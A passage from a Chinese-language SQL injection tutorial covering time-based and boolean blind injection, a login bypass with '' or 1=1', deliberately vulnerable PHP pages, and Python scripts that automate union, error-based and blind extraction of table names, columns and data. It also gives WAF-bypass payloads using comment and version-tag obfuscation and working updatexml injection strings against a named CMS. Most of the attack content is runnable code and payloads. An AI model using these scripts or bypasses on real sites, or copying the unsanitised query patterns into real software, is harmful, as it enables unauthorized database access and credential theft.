    ------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)
    mysql> select * from xinan where id =1 and (substr((select username from xinan
    limit 0,1),2,1)) = "h";
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

其实不难主要是payload构造以及比较费事麻烦，因为在实战当中要考虑到请求响应时间等问题。

# 0x08 时间盲注

php代码

    
    
    <?php
    include("../config.php");
    error_reporting(0);
    $id = $_GET["id"];
    if(empty($id)){
    $sql = "select username,id from xinan";
    $result = mysql_query($sql);
    }else{
    $sql = "select * from xinan where id=$id";
    $result = mysql_query($sql);
    }
    while($row = mysql_fetch_array($result)){
    }
    ?>

前面了解到当有回显到页面上就可以用联合注入，当存在 mysql_error() 等数据库报错函数就可以使用

报错注入，当页面为真只回显一个值为假就不回显的时候就可以使用布尔盲注，当什么都不回显的时候

就可以使用时间盲注，时间盲注就是通过 sleep() 函数来通过暂停执行，当语句带入到mysql当中即

可。

**获取数据库**

    
    
    mysql> select * from xinan where id =1 and if(length(database()) >
    1,sleep(5),1);
    Empty set (5.01 sec)
    mysql> select * from xinan where id =1 and if(length(database()) >
    6,sleep(5),1);
    +------+----------+
    | id | username |
    +------+----------+
    | 1 | zhangsan |
    +------+----------+
    1 row in set (0.00 sec)

第一个会延时5秒，第二个秒输出，其实跟布尔盲注用到的语法都是差不多的无非就是多了`if()` 和

`sleep()`函数。

**if函数**

    
    
    mysql> select if(1=1,1,2);
    +-------------+
    | if(1=1,1,2) |
    +-------------+
    | 1 |
    +-------------+
    1 row in set (0.00 sec)
    mysql> select if(1>1,1,2);
    +-------------+
    | if(1>1,1,2) |
    +-------------+
    | 2 |
    +-------------+
    1 row in set (0.00 sec)

意思就是当条件为真则输出第一个，条件为假就输出第二个值。

    
    
    if(条件,值1,值2)
    
    
    mysql> select * from xinan where id =1 and
    if((substr(database(),1,1)="s"),sleep(5),1);
    Empty set (5.00 sec)

这里就会延时5秒。其实获取表名列名跟布尔盲注一样，课件就不多说了。

# 0x09 post注入

1.mysql创建admin表

    
    
    mysql> create table admin(username varchar(10),password varchar(10));
    Query OK, 0 rows affected (0.00 sec)
    
    mysql> insert into admin(username,password) values("admin","P@ssw0rd");
    Query

2.php编写登陆点

    
    
    <html>
    <title>login page</title>
    <form action="./login.php" method="POST">
    username:<input type="text" name="username">
    password:<input type="text" name="password">
    <input type="submit" name="submit">
    </html>
    <?php
    include './config.php';
    if($_POST["submit"]){
    $username = $_POST["username"];
    $password = $_POST["password"];
    $sql = "select * from admin where username = '$username' and password =
    '$password'";
    echo $sql;
    $result = mysql_query($sql);
    $row = mysql_fetch_array($result);
    if($row){
    header("Location: ./admin.php");
    }else{
    echo "<script>alert('user or pass failed')</script>";
    }
    }
    ?>

当登录成功访问 admin.php 否则弹窗账号或者密码错误。

该点位`select * from admin where username=xx`。xx位置可控。

3.万能密码

当我们输入`' or 1=1 -- -` 。sql语句就为 `select * from admin where username='' or 1=1 ---'`

。前面一个 ' 闭合，后面的 -- - 注释掉后面的单引号。因为为 or 只要一边为真即为真也就是说 1=1 为

真前面无论是否正确都为正确值。4.其他注入

同样也可以通过时间来响应存在时间盲注

    
    
    mysql> select * from admin where username="" or (substr((select database()),1,1))
    = "s";
    +----------+----------+
    | username | password |
    +----------+----------+
    | admin | P@ssw0rd |
    +----------+----------+
    1 row in set (0.00 sec)
    mysql> select * from admin where username="" or if(((substr((select
    database()),1,1)) = "s"),sleep(5),1);
    Empty set (5.00 sec)

# 0x10 联合注入exp编写

    
    
    import requests
    url = "http://127.0.0.1/union.php?id=1"
    url_len = len(requests.get(url).text)
    column_count = 0
    union_return = ""
    for i in range(1,10):
        order_payload = url + " order by "+str(i)
        order_len = len(requests.get(order_payload).text)
        if(url_len != order_len):
            order_payload = url + " order by "+str(i-1)
            column_count = i-1
            break
    for i in range(1,column_count+1):
        union_return = union_return+str(i)+","
    union_return = union_return.strip(',')
    union_payload = url + " union select " + union_return
    print(requests.get(union_payload).text)
    count_choose = input("set count:")
    table = union_return.replace(count_choose,"group_concat(table_name)")
    table_payload = url + " union select "+ table + " from information_schema.tables where table_schema=database()"
    print(requests.get(table_payload).text)
    table_choose = input("choose table_name:")
    column = union_return.replace(count_choose,"group_concat(column_name)")
    column_payload = url + " union select "+column + " from information_schema.columns where table_schema=database() and table_name='"+table_choose+"'"
    print(requests.get(column_payload).text)
    dump_choose = input("choose dump:")
    dump = union_return.replace(count_choose,"group_concat("+dump_choose+")")
    dump_payload = url + " union select " + dump + " from " + table_choose
    print(requests.get(dump_payload).text)

![](./img/8721532069398957417.png)

# 0x11 报错注入exp编写

    
    
    import requests
    import re
    url = "http://127.0.0.1/error.php?id=1"
    table_payload = url + " and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)"
    table_response = requests.get(table_payload).text
    re_str = re.compile("XPATH syntax error: '(.*)",re.I|re.S)
    response = re_str.findall(table_response)
    print(response)
    column_choose = input("choose table:")
    column_payload = url + " and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='"+column_choose+"'"+"),0x7e),1)"
    column_response  = requests.get(column_payload).text
    re_str = re.compile("XPATH syntax error: '(.*)",re.I|re.S)
    response = re_str.findall(column_response)
    print(response)
    dump_choose = input("choose column:")
    dump_payload = url + " and updatexml(1,concat(0x7e,(select group_concat("+ dump_choose +") from "+ column_choose +" limit 0,1),0x7e),1)"
    dump_response = requests.get(dump_payload).text
    re_str = re.compile("XPATH syntax error: '(.*)",re.I|re.S)
    response = re_str.findall(dump_response)
    print(response)

![](./img/4542774816527713664.png)

# 0x12 布尔盲注

    
    
    import requests
    url = "http://localhost/bool.php?id=1"
    length_resp = int(len(requests.get(url).text))
    table_count = 0
    for i in range(1,10):
        table_count_payload = " and (select count(table_name) from information_schema.tables where table_schema=database()) =" + str(i)
        table_count_url = url + table_count_payload
        table_count = int(len(requests.get(table_count_url).text))
        print(table_count_url + ":" + str(table_count))
        if(length_resp == table_count):
            table_count = i
            break
    print("[+]table count:"+str(table_count))
    start_limit = 0
    for i in range(1,table_count+1):
        for table_length in range(1,11):
            table_length_payload = " and (select length(table_name) from information_schema.tables where table_schema=database() limit "+str(start_limit)+",1) = "+str(table_length)
            table_length_url = url + table_length_payload
            table_length_resp = int(len(requests.get(table_length_url).text))
            if(table_length_resp == length_resp):
                print(table_length_url)
                for ii in range(0,table_length+2):
                    for iii in range(1,124):
                        guess_table_name_payload = " and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(start_limit)+",1),"+str(ii)+",1)) = "+str(iii)
                        guess_table_name_url = url + guess_table_name_payload
                        guess_table_name_resp = int(len(requests.get(guess_table_name_url).text))
                        if(guess_table_name_resp == length_resp):
                            # print(guess_table_name_url)
                            print("第"+str(i)+"个表第"+str(ii)+"个表名为:"+chr(iii))
                            break
                print("第"+str(i)+"个表长度为:"+str(table_length))
                break
        start_limit += 1

![](./img/910537567794979142.png)

# 0x13 sql注入bypass waf

**绕过and**

    
    
    and 1=1 拦
    and 'a' > 1 拦
    and -1 > 1 拦
    and -1 <> 1 拦
    /index.php?id=if((1=1),1,2) 不拦

**绕过order by**

    
    
    /index.php?id=1/**/order/*//////*/by 3 过

**绕过union select**

    
    
    /index.php?id=1/**/union/*//////*//*!50441select*/ 1,2,3 过

![](./img/1453655516892140550.png)

**绕过database(),user()**

    
    
    /index.php?id=1/**/union/*//////*//*!50441select*/ 1,database(/*///*/),user(/*///*/)

![](./img/2634039463015017605.png)

**获取表名**

    
    
    /index.php?id=1/**/union/*//////*//*!50441select*/ 1,2,group_concat(table_name)
    from information_schema.tables where table_schema=database(/*///*/)

![](./img/5598656170969893876.png)

**获取列名**

    
    
    /index.php?
    id=1/**/union/*//////*//*!50441select*/%201,2,group_concat(column_name) from
    information_schema.columns where%20table_schema=database(/*///*/)
    and/*/////*/table_name="admin"

![](./img/3112892162109067912.png)

**获取数据**

    
    
    /index.php?id=1/**/union/*//////*//*!50441select*/
    1,group_concat(password),group_concat(username) from admin

![](./img/2800915873851754962.png)

**fuzz**

    
    
    /*%!*干扰

例如 `order by` 绕过。

![](./img/6192312351123333589.png)

![](./img/3465742357441964918.png)

![](./img/1696242023335060948.png)

payload:

    
    
    /index.php?id=1/*%2a%2a*/order/*%2f%2f*/by/*%2f%2f*/3

绕过 `union select` 直接使用干扰不行，需要加上 !版本号 来绕过。

![](./img/7217608894200182934.png)

![](./img/758134050190765763.png)

![](./img/3136210575239643282.png)

这里其实REGEXP "[…任意%23]"就行，在url解码%23变成了#，安全狗认为后面全都成为了注释符，带

入到mysql层面其实%23只是正则的一个参数并不是注释符

获取表名：

    
    
    /index.php?id=1 REGEXP "[…#]"
    /****/union/*//*//*!50441select*//*//*/1,2,group_concat(table_name) from
    information_schema.tables where table_schema=database(/*//*/)

获取列名：

    
    
    /index.php?id=1 REGEXP "[…#]"
    /****/union/*//*//*!50441select*//*//*/1,2,group_concat(column_name) from
    information_schema.columns where table_schema=database(/*//*/) and
    /*////*/table_name="admin"

获取数据：

    
    
    /index.php?id=1 REGEXP "[…#]"
    /****/union/*//*//*!50441select*//*//*/1,group_concat(password),group_concat(use
    rname) from admin

# 0x014 sql注入代码审计

### 1.1 /admin/files/login.php

先看后台/admin/files/login.php

![](./img/7031290761829076477.png)

可以看到没有过滤就直接带入查询了而且还写出报错，这里就可以使用报错注入  
payload

    
    
    user=11' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- +&password=11&login=yes

![](./img/6687625587715980181.png)

### 1.2 /files/submit.php

留言板同理,全都没做过滤

![](./img/2289627792506200299.png)

![](./img/2194928706938397877.png)

seay可以看到sql语句

![](./img/3104970822500094912.png)

### 1.3 /files/content.php

然后就是content.php可以看到前面虽然过滤了引号但是后面就没有过滤了

![](./img/4459939009563864252.png)

![](./img/3942013804045814148.png)

### 1.4 /admin/files/editcolumn.php

![](./img/8662537393709179158.png)

其他的就不多说了  
payload

    
    
    http://127.0.0.1/cms/xhcms/admin/?r=editcolumn&type=1&id=1%27%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))%20--+

![](./img/1742616024129231994.png)

